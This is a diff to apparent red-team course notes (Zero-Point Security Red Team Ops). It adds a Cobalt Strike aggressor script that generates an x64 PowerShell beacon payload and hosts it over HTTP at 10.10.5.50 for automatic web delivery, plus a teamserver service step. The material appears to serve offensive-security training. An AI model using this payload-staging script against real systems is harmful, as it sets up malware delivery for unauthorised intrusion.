@@ -92,3 +92,26 @@ mimi
 
 Create Dcom jumper
 [Red Team Ops - Zero-Point Security (zeropointsecurity.co.uk)](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/39198081-jump-remote-exec)
+
+
+```
+vim host_payloads.cna
+```
+
+```
+# Connected and ready
+on ready {
+
+    # Generate payload
+    $payload = artifact_payload("http", "powershell", "x64");
+
+    # Host payload
+    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
+}
+```
+
+Uncomment
+
+```
+sudo vim /etc/systemd/system/teamserver.service
+```
